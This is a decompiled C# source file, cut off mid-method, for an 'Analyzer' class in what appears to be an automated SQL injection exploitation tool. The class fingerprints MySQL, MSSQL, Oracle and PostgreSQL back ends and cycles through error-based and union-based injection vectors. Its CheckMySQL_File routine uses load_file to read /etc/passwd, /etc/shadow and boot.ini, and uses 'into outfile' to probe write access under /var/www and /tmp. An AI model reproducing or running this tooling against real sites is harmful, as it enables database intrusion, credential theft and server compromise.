using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using DataBase;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

public class Analyzer
{
	public delegate void OnProgressEventHandler(Analyzer sender, string sDesc, int iPerc);

	private Stopwatch stopwatch_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private MySQLErrorType mySQLErrorType_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private MySQLCollactions mySQLCollactions_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private OracleErrorType oracleErrorType_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private PostgreSQLErrorType postgreSQLErrorType_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private string string_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private int int_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private int int_1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private string string_1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private int int_2;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private int int_3;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private int int_4;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private List<string> list_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private List<string> list_1;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_2;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_3;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private bool bool_5;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private bool bool_7;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_8;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private string string_2;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private string string_3;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private int int_5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private bool bool_9;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private Types types_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private InjectionFormat injectionFormat_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private string string_4;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_10;

	private bool bool_11;

	private HTTPExt httpext_0;

	private string string_5;

	private Globals.WebServer webServer_0;

	private Stopwatch stopwatch_1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private List<int> list_2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private string string_6;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_12;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private bool bool_13;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private int int_6;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private string string_7;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private OnProgressEventHandler onProgressEventHandler_0;

	public MySQLErrorType MySQLErrorType
	{
		[CompilerGenerated]
		get
		{
			return mySQLErrorType_0;
		}
		[CompilerGenerated]
		set
		{
			mySQLErrorType_0 = value;
		}
	}

	public MySQLCollactions MySQLCollactions
	{
		[CompilerGenerated]
		get
		{
			return mySQLCollactions_0;
		}
		[CompilerGenerated]
		set
		{
			mySQLCollactions_0 = value;
		}
	}

	public OracleErrorType OracleErrorType
	{
		[CompilerGenerated]
		get
		{
			return oracleErrorType_0;
		}
		[CompilerGenerated]
		set
		{
			oracleErrorType_0 = value;
		}
	}

	public bool OracleCast
	{
		[CompilerGenerated]
		get
		{
			return bool_0;
		}
		[CompilerGenerated]
		set
		{
			bool_0 = value;
		}
	}

	public PostgreSQLErrorType PostgreSQLErrorType
	{
		[CompilerGenerated]
		get
		{
			return postgreSQLErrorType_0;
		}
		[CompilerGenerated]
		set
		{
			postgreSQLErrorType_0 = value;
		}
	}

	public bool MSSQLCollate
	{
		[CompilerGenerated]
		get
		{
			return bool_1;
		}
		[CompilerGenerated]
		set
		{
			bool_1 = value;
		}
	}

	public string MSSQLCast
	{
		[CompilerGenerated]
		get
		{
			return string_0;
		}
		[CompilerGenerated]
		set
		{
			string_0 = value;
		}
	}

	public int Retry
	{
		[CompilerGenerated]
		get
		{
			return int_0;
		}
		[CompilerGenerated]
		set
		{
			int_0 = value;
		}
	}

	public int Delay
	{
		[CompilerGenerated]
		get
		{
			return int_1;
		}
		[CompilerGenerated]
		set
		{
			int_1 = value;
		}
	}

	public string ExploitCode
	{
		[CompilerGenerated]
		get
		{
			return string_1;
		}
		[CompilerGenerated]
		set
		{
			string_1 = value;
		}
	}

	public int UnionStart
	{
		[CompilerGenerated]
		get
		{
			return int_2;
		}
		[CompilerGenerated]
		set
		{
			int_2 = value;
		}
	}

	public int UnionEnd
	{
		[CompilerGenerated]
		get
		{
			return int_3;
		}
		[CompilerGenerated]
		set
		{
			int_3 = value;
		}
	}

	public int Timeout
	{
		[CompilerGenerated]
		get
		{
			return int_4;
		}
		[CompilerGenerated]
		set
		{
			int_4 = value;
		}
	}

	public List<string> VectorsUnion
	{
		[CompilerGenerated]
		get
		{
			return list_0;
		}
		[CompilerGenerated]
		set
		{
			list_0 = value;
		}
	}

	public List<string> VectorsError
	{
		[CompilerGenerated]
		get
		{
			return list_1;
		}
		[CompilerGenerated]
		set
		{
			list_1 = value;
		}
	}

	public bool SkipMsAcessAndSybase
	{
		[CompilerGenerated]
		get
		{
			return bool_2;
		}
		[CompilerGenerated]
		set
		{
			bool_2 = value;
		}
	}

	public bool CheckUnionMySQLerr
	{
		[CompilerGenerated]
		get
		{
			return bool_3;
		}
		[CompilerGenerated]
		set
		{
			bool_3 = value;
		}
	}

	public bool CheckUnionMsSQLerr
	{
		[CompilerGenerated]
		get
		{
			return bool_4;
		}
		[CompilerGenerated]
		set
		{
			bool_4 = value;
		}
	}

	public bool CheckUnionOracleErr
	{
		[CompilerGenerated]
		get
		{
			return bool_5;
		}
		[CompilerGenerated]
		set
		{
			bool_5 = value;
		}
	}

	public bool CheckUnionPostgreErr
	{
		[CompilerGenerated]
		get
		{
			return bool_6;
		}
		[CompilerGenerated]
		set
		{
			bool_6 = value;
		}
	}

	public bool FollowRedirects
	{
		[CompilerGenerated]
		get
		{
			return bool_7;
		}
		[CompilerGenerated]
		set
		{
			bool_7 = value;
		}
	}

	public bool UnionKeyword
	{
		[CompilerGenerated]
		get
		{
			return bool_8;
		}
		[CompilerGenerated]
		set
		{
			bool_8 = value;
		}
	}

	public string ResultError
	{
		[CompilerGenerated]
		get
		{
			return string_2;
		}
		[CompilerGenerated]
		set
		{
			string_2 = value;
		}
	}

	public string ResultUnion
	{
		[CompilerGenerated]
		get
		{
			return string_3;
		}
		[CompilerGenerated]
		set
		{
			string_3 = value;
		}
	}

	public int ResultUnionColumn
	{
		[CompilerGenerated]
		get
		{
			return int_5;
		}
		[CompilerGenerated]
		set
		{
			int_5 = value;
		}
	}

	public bool RetyFailed
	{
		[CompilerGenerated]
		get
		{
			return bool_9;
		}
		[CompilerGenerated]
		set
		{
			bool_9 = value;
		}
	}

	public Types DBType
	{
		[CompilerGenerated]
		get
		{
			return types_0;
		}
		[CompilerGenerated]
		set
		{
			types_0 = value;
		}
	}

	public InjectionFormat VectorType
	{
		[CompilerGenerated]
		get
		{
			return injectionFormat_0;
		}
		[CompilerGenerated]
		set
		{
			injectionFormat_0 = value;
		}
	}

	public string Version
	{
		[CompilerGenerated]
		get
		{
			return string_4;
		}
		[CompilerGenerated]
		set
		{
			string_4 = value;
		}
	}

	public string GetDomain => Class23.smethod_11(string_5);

	public bool WasRedirected
	{
		[CompilerGenerated]
		get
		{
			return bool_10;
		}
		[CompilerGenerated]
		set
		{
			bool_10 = value;
		}
	}

	public List<int> KnowUrlPositions
	{
		[CompilerGenerated]
		get
		{
			return list_2;
		}
		[CompilerGenerated]
		set
		{
			list_2 = value;
		}
	}

	public string KnowUrlInjectPoint
	{
		[CompilerGenerated]
		get
		{
			return string_6;
		}
		[CompilerGenerated]
		set
		{
			string_6 = value;
		}
	}

	public bool HtmlOriginalShowSQL
	{
		[CompilerGenerated]
		get
		{
			return bool_12;
		}
		[CompilerGenerated]
		set
		{
			bool_12 = value;
		}
	}

	public bool KnowUrlInjectPointWithComment
	{
		[CompilerGenerated]
		get
		{
			return bool_13;
		}
		[CompilerGenerated]
		set
		{
			bool_13 = value;
		}
	}

	public int OpType
	{
		[CompilerGenerated]
		get
		{
			return int_6;
		}
		[CompilerGenerated]
		set
		{
			int_6 = value;
		}
	}

	public string Keyword
	{
		[CompilerGenerated]
		get
		{
			return string_7;
		}
		[CompilerGenerated]
		set
		{
			string_7 = value;
		}
	}

	internal HTTPExt HTTPExt_0 => httpext_0;

	public event OnProgressEventHandler OnProgress
	{
		[CompilerGenerated]
		add
		{
			OnProgressEventHandler onProgressEventHandler = onProgressEventHandler_0;
			OnProgressEventHandler onProgressEventHandler2;
			do
			{
				onProgressEventHandler2 = onProgressEventHandler;
				OnProgressEventHandler value2 = (OnProgressEventHandler)Delegate.Combine(onProgressEventHandler2, value);
				onProgressEventHandler = Interlocked.CompareExchange(ref onProgressEventHandler_0, value2, onProgressEventHandler2);
			}
			while ((object)onProgressEventHandler != onProgressEventHandler2);
		}
		[CompilerGenerated]
		remove
		{
			OnProgressEventHandler onProgressEventHandler = onProgressEventHandler_0;
			OnProgressEventHandler onProgressEventHandler2;
			do
			{
				onProgressEventHandler2 = onProgressEventHandler;
				OnProgressEventHandler value2 = (OnProgressEventHandler)Delegate.Remove(onProgressEventHandler2, value);
				onProgressEventHandler = Interlocked.CompareExchange(ref onProgressEventHandler_0, value2, onProgressEventHandler2);
			}
			while ((object)onProgressEventHandler != onProgressEventHandler2);
		}
	}

	public Analyzer(string sUrl, int bIsDumper, HTTPExt http = null)
	{
		stopwatch_0 = Stopwatch.StartNew();
		MySQLErrorType = MySQLErrorType.DuplicateEntry;
		MySQLCollactions = MySQLCollactions.UnHex;
		OracleCast = false;
		MSSQLCast = "char";
		Retry = Conversions.ToInteger(Globals.GetObjectValue(Globals.GMain.numHTTPRetry));
		Delay = Conversions.ToInteger(Globals.GetObjectValue(Globals.GMain.numExploitingDelay));
		ExploitCode = Conversions.ToString(Globals.GetObjectValue(Globals.GMain.txtAnalizerExploitCode));
		UnionStart = Conversions.ToInteger(Globals.GetObjectValue(Globals.GMain.numAnalizerUnionSart));
		UnionEnd = Conversions.ToInteger(Globals.GetObjectValue(Globals.GMain.numAnalizerUnionEnd));
		Timeout = Conversions.ToInteger(Globals.GetObjectValue(Globals.GMain.numHTTPTimeout));
		SkipMsAcessAndSybase = true;
		FollowRedirects = true;
		UnionKeyword = true;
		Version = "";
		stopwatch_1 = Stopwatch.StartNew();
		Keyword = "";
		string_5 = sUrl;
		OpType = bIsDumper;
		if (http == null)
		{
			if (OpType == 1)
			{
				httpext_0 = Globals.GMain.DumperForm.AppDomainControl_0.GetHTTP();
			}
			else if (OpType == 2)
			{
				httpext_0 = Globals.GMain.AppDomainControl_0.GetHTTP();
			}
		}
		else
		{
			httpext_0 = http;
		}
	}

	public string RequestElapsed()
	{
		return Strings.FormatNumber(stopwatch_0.Elapsed.TotalMilliseconds / 1000.0, 2);
	}

	public override string ToString()
	{
		if (Conversions.ToBoolean(string.IsInterned(ResultUnion)))
		{
			return ResultError;
		}
		return ResultUnion;
	}

	public bool IsExploitable(string html)
	{
		return IsExploitable(Class54.smethod_3(html));
	}

	public bool IsExploitable(Types db)
	{
		return db switch
		{
			Types.Unknown => false, 
			Types.None => false, 
			Types.Sybase => !SkipMsAcessAndSybase, 
			Types.MsAccess => !SkipMsAcessAndSybase, 
			_ => true, 
		};
	}

	public Types CheckExploit(string sUrl = "")
	{
		int num = 1;
		List<string> list = new List<string>();
		if (string.IsNullOrEmpty(sUrl))
		{
			list = Class23.smethod_17(string_5, ExploitCode, bool_0: false, bool_1: true);
		}
		else
		{
			list.Add(sUrl);
		}
		KnowUrlPositions = new List<int>();
		Types types = default(Types);
		bool flag = default(bool);
		foreach (string item in list)
		{
			onProgressEventHandler_0?.Invoke(this, "[" + Conversions.ToString(num) + "/" + Conversions.ToString(list.Count) + "] " + Globals.translate_0.GetStr(Globals.GMain, 117), Globals.FormatPercentage(num, list.Count));
			num = checked(num + 1);
			types = method_12(item);
			if (httpext_0.WasRedirected() && !IsExploitable(types))
			{
				FollowRedirects = false;
				types = method_12(item);
				if (!IsExploitable(types))
				{
					FollowRedirects = true;
				}
			}
			if (IsExploitable(types))
			{
				KnowUrlPositions.Add(num);
				if (!Class54.smethod_10(types) & IsExploitable(types))
				{
					DBType = types;
					break;
				}
			}
			else if (UnionKeyword)
			{
				KnowUrlPositions.Add(num);
			}
			if (flag || Globals.GMain.method_23())
			{
				break;
			}
		}
		if (IsExploitable(types))
		{
			DBType = types;
		}
		return DBType;
	}

	public bool TryErrorBasead()
	{
		return method_1(InjectionType.Error);
	}

	public bool TryUnionBasead()
	{
		return method_1(InjectionType.Union);
	}

	public bool CheckVersionNoCollactions(string url, bool checkRedirects = false)
	{
		string url2 = "";
		List<string> list = new List<string>();
		onProgressEventHandler_0?.Invoke(this, Globals.translate_0.GetStr(Globals.GMain, 118), -1);
		bool flag;
		if ((flag = true) == Class54.smethod_9(DBType))
		{
			list.Add("version()");
		}
		else if (flag == Class54.smethod_10(DBType))
		{
			list.Add("@@version");
		}
		else if (flag == Class54.smethod_11(DBType))
		{
			list.Add("(select banner from v$version where banner like " + Class23.smethod_21("%Oracle%", bool_0: false, "||", "chr") + ")");
		}
		else
		{
			if (flag != Class54.smethod_12(DBType))
			{
				return false;
			}
			list.Add("version()");
		}
		InjectionType injectionType = (url.ToLower().Contains("union") ? InjectionType.Union : InjectionType.Error);
		if (((VectorType == InjectionFormat.String) | (DBType == Types.Oracle_With_Error)) && Class54.smethod_11(DBType) && OracleErrorType == OracleErrorType.NONE)
		{
			OracleErrorType = OracleErrorType.GET_HOST_ADDRESS;
		}
		int num = default(int);
		bool flag3 = default(bool);
		while (true)
		{
			List<string> list2 = new List<string>();
			do
			{
				bool flag2;
				if ((flag2 = true) != Class54.smethod_9(DBType))
				{
					if (flag2 == Class54.smethod_10(DBType))
					{
						switch (num)
						{
						case 0:
							break;
						case 1:
							goto IL_0185;
						case 2:
							goto IL_01af;
						case 3:
							goto IL_01d9;
						case 4:
							goto IL_020a;
						default:
							goto end_IL_040e;
						}
						url2 = MSSQL.Info(url, injectionType, MSSQLCollate, list, "char");
						MSSQLCast = "char";
					}
					else if (flag2 == Class54.smethod_11(DBType))
					{
						if (num != 0)
						{
							if (num != 1)
							{
								break;
							}
							OracleCast = !OracleCast;
							url2 = Oracle.Info(url, injectionType, OracleErrorType, list, OracleCast);
						}
						else
						{
							url2 = Oracle.Info(url, injectionType, OracleErrorType, list, OracleCast);
						}
					}
					else if (flag2 == Class54.smethod_12(DBType))
					{
						if (injectionType == InjectionType.Union)
						{
							PostgreSQLErrorType = PostgreSQLErrorType.NONE;
						}
						else
						{
							PostgreSQLErrorType = PostgreSQLErrorType.CAST_INT;
						}
						if (num > 0)
						{
							break;
						}
						url2 = PostgreSQL.Info(url, injectionType, PostgreSQLErrorType, list);
					}
				}
				else
				{
					if (injectionType != InjectionType.Union)
					{
						if (num == 0)
						{
							MySQLCollactions = MySQLCollactions.UnHex;
						}
						else
						{
							MySQLCollactions = MySQLCollactions.None;
						}
						switch (num)
						{
						case 0:
							MySQLErrorType = MySQLErrorType.UpdateXML;
							goto IL_03f0;
						case 1:
							MySQLErrorType = MySQLErrorType.DuplicateEntry;
							goto IL_03f0;
						case 2:
							{
								MySQLErrorType = MySQLErrorType.ExtractValue;
								goto IL_03f0;
							}
							IL_03f0:
							url2 = MySQLWithError.Info(url, MySQLCollactions, MySQLErrorType, list);
							goto IL_02e3;
						}
						break;
					}
					switch (num)
					{
					case 0:
						break;
					case 1:
						goto IL_035a;
					case 2:
						goto IL_0375;
					case 3:
						goto IL_0390;
					default:
						goto end_IL_040e;
					}
					url2 = MySQLNoError.Info(url, MySQLCollactions.UnHex, bHexEncoded: false, list);
					MySQLCollactions = MySQLCollactions.UnHex;
				}
				goto IL_02e3;
				IL_0185:
				url2 = MSSQL.Info(url, injectionType, MSSQLCollate, list, "");
				MSSQLCast = "";
				goto IL_02e3;
				IL_01d9:
				MSSQLCollate = false;
				url2 = MSSQL.Info(url, injectionType, MSSQLCollate, list, "char");
				MSSQLCast = "char";
				goto IL_02e3;
				IL_0390:
				url2 = MySQLNoError.Info(url, MySQLCollactions.CastAsChar, bHexEncoded: false, list);
				MySQLCollactions = MySQLCollactions.CastAsChar;
				goto IL_02e3;
				IL_0375:
				url2 = MySQLNoError.Info(url, MySQLCollactions.Binary, bHexEncoded: false, list);
				MySQLCollactions = MySQLCollactions.Binary;
				goto IL_02e3;
				IL_035a:
				url2 = MySQLNoError.Info(url, MySQLCollactions.None, bHexEncoded: false, list);
				MySQLCollactions = MySQLCollactions.None;
				goto IL_02e3;
				IL_020a:
				url2 = MSSQL.Info(url, injectionType, MSSQLCollate, list, "");
				MSSQLCast = "";
				goto IL_02e3;
				IL_02e3:
				list2 = HTML_ParseHtmlData(url2);
				flag3 = list2.Count > 0;
				num = checked(num + 1);
				continue;
				IL_01af:
				url2 = MSSQL.Info(url, injectionType, MSSQLCollate, list, "nvarchar");
				MSSQLCast = "nvarchar";
				goto IL_02e3;
				continue;
				end_IL_040e:
				break;
			}
			while (!(flag3 | RetyFailed) && !method_0());
			if (!flag3)
			{
				if (!checkRedirects || !(WasRedirected & FollowRedirects))
				{
					break;
				}
				num = 0;
				FollowRedirects = false;
				checkRedirects = false;
				continue;
			}
			Version = method_10(list2[0]);
			break;
		}
		return flag3;
	}

	public List<string> GetInfo(string url, string sColumn)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list.Add(sColumn);
		InjectionType injectionType = (url.ToLower().Contains("union") ? InjectionType.Union : InjectionType.Error);
		bool flag;
		if ((flag = true) == Class54.smethod_9(DBType))
		{
			url = ((injectionType != InjectionType.Error) ? MySQLNoError.Info(url, MySQLCollactions, bHexEncoded: false, list) : MySQLWithError.Info(url, MySQLCollactions, MySQLErrorType, list));
		}
		else if (flag == Class54.smethod_10(DBType))
		{
			url = MSSQL.Info(url, injectionType, MSSQLCollate, list, MSSQLCast);
		}
		else if (flag == Class54.smethod_11(DBType))
		{
			url = Oracle.Info(url, injectionType, OracleErrorType, list, OracleCast);
		}
		else if (flag == Class54.smethod_12(DBType))
		{
			url = PostgreSQL.Info(url, injectionType, PostgreSQLErrorType, list);
		}
		return HTML_ParseHtmlData(url);
	}

	public bool CheckMySQL_File(string url, ref string sReadPath, ref string sWritePath)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		List<string> list3 = new List<string>();
		if (DBType != Types.MySQL_No_Error)
		{
			return false;
		}
		if (webServer_0 == Globals.WebServer.WINDOWS)
		{
			list.Add("c:\\\\");
			list.Add("c:\\");
			list.Add("d:\\\\");
			list.Add("e:\\\\");
			list.Add("c://");
			list.Add("c:/");
			list2.Add("c:\\\\boot.ini");
			list2.Add("c:\\boot.ini");
			list2.Add("c:/boot.ini");
			list2.Add("c://boot.ini");
			list2.Add("d:\\\\boot.ini");
			list2.Add("e:\\\\boot.ini");
		}
		else
		{
			list.Add("");
			list.Add("/var/www/");
			list.Add("/var/www/");
			list.Add("/tmp/");
			list.Add("/etc/passwd/");
			list.Add("/etc/shadow/");
			list2.Add("/etc/passwd");
			list2.Add("/etc/shadow");
			list2.Add("/etc/group");
			list2.Add("\\etc\\passwd");
			list2.Add("//etc//passwd");
		}
		if (method_8(url))
		{
			onProgressEventHandler_0?.Invoke(this, "load_file: user_privileges", -1);
			sReadPath = "user_privileges";
		}
		checked
		{
			int num = default(int);
			foreach (string item in list2)
			{
				num++;
				onProgressEventHandler_0?.Invoke(this, "[" + Conversions.ToString(num) + "/" + Conversions.ToString(list2.Count) + "] load_file: " + item, Globals.FormatPercentage(num, list2.Count));
				list3 = GetInfo(url, "load_file(" + Class23.smethod_20(item) + ")");
				if (list3.Count > 0)
				{
					if (string.IsNullOrEmpty(sReadPath))
					{
						sReadPath = item;
					}
					else
					{
						sReadPath = item + " : " + sReadPath;
					}
					break;
				}
			}
			onProgressEventHandler_0?.Invoke(this, Globals.translate_0.GetStr(Globals.GMain, 119), -1);
			list3 = GetInfo(url, "'1234ABCS45D0999'");
			if (list3.Count > 0)
			{
				string text = DateAndTime.Now.Ticks.ToString();
				num = 0;
				foreach (string item2 in list)
				{
					num++;
					onProgressEventHandler_0?.Invoke(this, "[" + Conversions.ToString(num) + "/" + Conversions.ToString(list.Count) + "] " + Globals.translate_0.GetStr(Globals.GMain, 120) + item2, Globals.FormatPercentage(num, list.Count));
					string current2 = item2 + text;
					GetInfo(url, Class23.smethod_20("123ABC") + " into outfile '" + current2 + "'");
					list3 = GetInfo(url, "load_file(" + Class23.smethod_20(current2) + ")");
					if (list3.Count > 0)
					{
						sWritePath = current2;
						break;
					}
				}
			}
			return !string.IsNullOrEmpty(sReadPath) | !string.IsNullOrEmpty(sWritePath);
		}
	}

	public void Dispose()
	{
		if (httpext_0 != null)
		{
			httpext_0.Dispose();
		}
	}

	public void Reset()
	{
		VectorType = InjectionFormat.None;
		DBType = Types.None;
		RetyFailed = false;
		ResultUnion = string.Empty;
		ResultUnionColumn = 0;
		ResultError = string.Empty;
		KnowUrlInjectPoint = string.Empty;
		KnowUrlPositions = null;
		HtmlOriginalShowSQL = false;
		KnowUrlInjectPointWithComment = false;
	}

	private bool method_0()
	{
		if (OpType == 1)
		{
			return Globals.GMain.DumperForm.WorkedRequestStop();
		}
		if (OpType == 0)
		{
			return Globals.GMain.method_23();
		}
		bool result = default(bool);
		return result;
	}

	private bool method_1(InjectionType injectionType_0)
	{
		List<string> list = new List<string>();
		List<string> list2 = ((injectionType_0 != InjectionType.Error) ? VectorsUnion : VectorsError);
		checked
		{
			int num = default(int);
			bool flag = default(bool);
			foreach (string item in list2)
			{
				string text = item;
				switch (VectorType)
				{
				case InjectionFormat.Integer:
					if (text.Contains("'"))
					{
						continue;
					}
					break;
				case InjectionFormat.String:
					if (!text.Contains("'"))
					{
						continue;
					}
					break;
				}
				if (injectionType_0 == InjectionType.Union)
				{
					if (Class54.smethod_11(DBType))
					{
						text = text.Replace("[t]", "[t] from dual");
					}
					if (Class54.smethod_9(DBType) && Version.StartsWith("4"))
					{
						return false;
					}
				}
				List<string> list3;
				if (!string.IsNullOrEmpty(KnowUrlInjectPoint))
				{
					if (KnowUrlInjectPointWithComment)
					{
						if (!text.EndsWith("--"))
						{
							continue;
						}
					}
					else if (text.EndsWith("--"))
					{
						continue;
					}
					list3 = new List<string>();
					list3.Add(KnowUrlInjectPoint.Replace("[t]", text));
				}
				else
				{
					list3 = Class23.smethod_17(string_5, text, bool_0: false, (Operators.CompareString(text.Substring(0, 1), "[", TextCompare: false) != 0) & (text.StartsWith("'") | text.StartsWith(" ")));
					if (injectionType_0 == InjectionType.Union)
					{
						list = Class23.smethod_17(string_5, "[t]", bool_0: false, (Operators.CompareString(text.Substring(0, 1), "[", TextCompare: false) != 0) & (text.StartsWith("'") | text.StartsWith(" ")));
					}
				}
				num++;
				RetyFailed = false;
				int num2 = list3.Count - 1;
				for (int i = 0; i <= num2; i++)
				{
					string text2 = list3[i];
					if (injectionType_0 == InjectionType.Error)
					{
						onProgressEventHandler_0?.Invoke(this, "[" + Conversions.ToString(num) + "/" + Conversions.ToString(list2.Count) + "] " + Globals.translate_0.GetStr(Globals.GMain, 121) + ": " + text, Globals.FormatPercentage(num + 1, list2.Count * list3.Count));
						flag = method_2(text2);
					}
					else
					{
						bool_11 = false;
						if ((UnionKeyword & (list.Count > 0)) && !flag)
						{
							Keyword = method_7(list[0]);
						}
						onProgressEventHandler_0?.Invoke(this, "[" + Conversions.ToString(num) + "/" + Conversions.ToString(list2.Count) + "] " + Globals.translate_0.GetStr(Globals.GMain, 122) + ": " + text, Globals.FormatPercentage(num + 1, list2.Count * list3.Count));
						flag = method_3(text2);
					}
					if (!flag)
					{
						if (Globals.GMain.method_23() | RetyFailed)
						{
							break;
						}
						continue;
					}
					if (injectionType_0 == InjectionType.Error)
					{
						ResultError = text2;
						KnowUrlInjectPoint = text2.Replace(text, "[t]");
						KnowUrlInjectPointWithComment = text.EndsWith("--");
					}
					if (text.Contains("'"))
					{
						VectorType = InjectionFormat.String;
					}
					else
					{
						VectorType = InjectionFormat.Integer;
					}
					if (Globals.GStatistics != null)
					{
						Globals.GStatistics.method_1(Class26.Enum1.const_2, text, 1);
					}
					return true;
				}
				if (Globals.GMain.method_23())
				{
					break;
				}
			}
			return flag;
		}
	}

	private bool method_2(string string_8)
	{
		string keyword = "A9615C78430D";
		string text = "";
		List<string> list = new List<string>();
		InjectionType injectionType = InjectionType.Error;
		string text2 = string_8;
		bool flag;
		bool flag2 = default(bool);
		if ((flag = true) == Class54.smethod_9(DBType))
		{
			text = Class23.smethod_20(keyword);
			list.Add(text);
			int num = 0;
			do
			{
				switch (num)
				{
				case 2:
					MySQLErrorType = MySQLErrorType.UpdateXML;
					break;
				case 1:
					MySQLErrorType = MySQLErrorType.ExtractValue;
					break;
				case 0:
					MySQLErrorType = MySQLErrorType.DuplicateEntry;
					break;
				}
				text2 = MySQLWithError.Info(text2, MySQLCollactions, MySQLErrorType, list);
				flag2 = HTML_CheckKeyword(text2, keyword);
				if ((Globals.GMain.method_23() | RetyFailed) || flag2)
				{
					break;
				}
				num = checked(num + 1);
			}
			while (num <= 2);
		}
		else if (flag == Class54.smethod_10(DBType))
		{
			text = Class23.smethod_21(keyword, bool_0: false);
			list.Add(text);
			int num = 0;
			do
			{
				if (num == 0)
				{
					MSSQLCollate = false;
				}
				else if (num == 1)
				{
					MSSQLCollate = true;
				}
				text2 = MSSQL.Info(text2, injectionType, MSSQLCollate, list, "");
				flag2 = HTML_CheckKeyword(text2, keyword);
				if ((Globals.GMain.method_23() | RetyFailed) || flag2)
				{
					break;
				}
				num = checked(num + 1);
			}
			while (num <= 1);
		}
		else if (flag == Class54.smethod_11(DBType))
		{
			text = Class23.smethod_21(keyword, bool_0: false, "||", "chr");
			list.Add(text);
			int num = 0;
			do
			{
				switch (num)
				{
				case 2:
					OracleErrorType = OracleErrorType.GETMAPPINGXPATH;
					break;
				case 1:
					OracleErrorType = OracleErrorType.DRITHSX_SN;
					break;
				case 0:
					OracleErrorType = OracleErrorType.GET_HOST_ADDRESS;
					break;
				}
				text2 = Oracle.Info(text2, injectionType, OracleErrorType, list, OracleCast);
				flag2 = HTML_CheckKeyword(text2, keyword);
				if ((Globals.GMain.method_23() | RetyFailed) || flag2)
				{
					break;
				}
				num = checked(num + 1);
			}
			while (num <= 2);
		}
		else if (flag == Class54.smethod_12(DBType))
		{
			text = Class23.smethod_21(keyword, bool_0: false, "||", "chr");
			list.Add(text);
			PostgreSQLErrorType = PostgreSQLErrorType.CAST_INT;
			text2 = PostgreSQL.Info(text2, InjectionType.Error, PostgreSQLErrorType, list);
			flag2 = HTML_CheckKeyword(text2, keyword);
		}
		if (flag2)
		{
			bool flag3;
			if ((flag3 = true) == Class54.smethod_9(DBType))
			{
				DBType = Types.MySQL_With_Error;
			}
			else if (flag3 == Class54.smethod_10(DBType))
			{
				DBType = Types.MSSQL_With_Error;
			}
			else if (flag3 == Class54.smethod_11(DBType))
			{
				DBType = Types.Oracle_With_Error;
			}
			else if (flag3 == Class54.smethod_12(DBType))
			{
				DBType = Types.PostgreSQL_With_Error;
			}
			CheckVersionNoCollactions(string_8);
		}
		return flag2;
	}

	private bool method_3(string string_8)
	{
		int unionStart = UnionStart;
		int unionEnd = UnionEnd;
		int num = unionStart;
		while (true)
		{
			if (num <= unionEnd)
			{
				if (UnionKeyword)
				{
					if (!string.IsNullOrEmpty(Keyword) && !bool_11 && method_5(string_8, num, Keyword))
					{
						return true;
					}
					if (Class54.smethod_11(DBType))
					{
						return false;
					}
				}
				if (!method_4(string_8, num))
				{
					if (Globals.GMain.method_23() | RetyFailed)
					{
						break;
					}
					num = checked(num + 1);
					continue;
				}
				return true;
			}
			return false;
		}
		return false;
	}

	private bool method_4(string string_8, int int_7)
	{
		string text = "";
		string text2 = "961578430";
		int num = 1;
		checked
		{
